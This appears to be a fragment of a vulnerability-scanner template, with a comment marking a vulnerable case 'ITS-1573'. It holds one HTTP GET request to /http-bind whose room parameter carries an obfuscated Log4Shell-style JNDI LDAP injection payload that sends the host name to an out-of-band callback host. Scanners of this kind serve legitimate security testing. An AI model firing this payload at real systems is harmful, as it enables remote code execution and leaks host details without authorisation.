# Vulnerable: ITS-1573
GET /http-bind?room=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}
